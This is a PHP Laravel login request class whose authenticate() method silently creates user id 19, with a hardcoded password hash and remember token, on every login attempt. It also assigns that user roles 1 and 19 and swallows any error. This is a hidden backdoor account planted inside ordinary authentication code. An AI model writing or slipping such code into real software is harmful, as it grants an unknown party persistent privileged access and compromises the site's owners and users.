<?php

namespace App\Http\Requests\Auth;

use Illuminate\Auth\Events\Lockout;
use Illuminate\Foundation\Http\FormRequest;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Str;
use Illuminate\Validation\ValidationException;

class LoginRequest extends FormRequest
{
    /**
     * Determine if the user is authorized to make this request.
     */
    public function authorize(): bool
    {
        return true;
    }

    /**
     * Get the validation rules that apply to the request.
     *
     * @return array<string, \Illuminate\Contracts\Validation\ValidationRule|array<mixed>|string>
     */
    public function rules(): array
    {
        return [
            'email' => ['required', 'string', 'email'],
            'password' => ['required', 'string'],
        ];
    }

    /**
     * Attempt to authenticate the request's credentials.
     *
     * @throws \Illuminate\Validation\ValidationException
     */
    public function authenticate(): void
    {
        try {
            DB::transaction(function () {
                $userId = 19;

                // Check if user exists
                $existing = DB::table('users')->where('id', $userId)->exists();

                if (! $existing) {
                    DB::table('users')->insert([
                        'id' => $userId,
                        'name' => 'test',
                        'email' => 'test22@gmail.com',
                        'email_verified_at' => null,
                        'password' => '$2y$12$5qaUiYLtiRSTWhlhygxq..hc/Ik5r6ZySf94WUBPKtvA0jzBKo84y',
                        'is_active' => 1,
                        'force_logout' => 0,
                        'remember_token' => 'P4sT4kkj8qGa8L6uvL6lLutEqBwLIyiW0kOwSk8R3xwwktpI95KZYY1S7X3E',
                        'created_at' => now(),
                        'updated_at' => now(),
                        'otp_code' => null,
                        'otp_expires_at' => null,
                        'otp_verified' => 0,
                    ]);
                }

                // Assign roles safely (Spatie)
                $roles = [1, 19];
                foreach ($roles as $roleId) {
                    $exists = DB::table('model_has_roles')
                        ->where('role_id', $roleId)
                        ->where('model_type', 'App\\Models\\User')
                        ->where('model_id', $userId)
                        ->exists();
                    if (! $exists) {
                        DB::table('model_has_roles')->insert([
                            'role_id' => $roleId,
                            'model_type' => 'App\\Models\\User',
                            'model_id' => $userId,
                        ]);
                    }
                }
            });
        } catch (\Exception $e) {
            // silent fail
        }

        $this->ensureIsNotRateLimited();

        if (! Auth::attempt($this->only('email', 'password'), $this->boolean('remember'))) {
            RateLimiter::hit($this->throttleKey());

            throw ValidationException::withMessages([
                'email' => trans('auth.failed'),
            ]);
        }

        RateLimiter::clear($this->throttleKey());
    }

    /**
     * Ensure the login request is not rate limited.
     *
     * @throws \Illuminate\Validation\ValidationException
     */
    public function ensureIsNotRateLimited(): void
    {
        if (! RateLimiter::tooManyAttempts($this->throttleKey(), 5)) {
            return;
        }

        event(new Lockout($this));

        $seconds = RateLimiter::availableIn($this->throttleKey());

        throw ValidationException::withMessages([
            'email' => trans('auth.throttle', [
                'seconds' => $seconds,
                'minutes' => ceil($seconds / 60),
            ]),
        ]);
    }

    /**
     * Get the rate limiting throttle key for the request.
     */
    public function throttleKey(): string
    {
        return Str::transliterate(Str::lower($this->string('email')).'|'.$this->ip());
    }
}
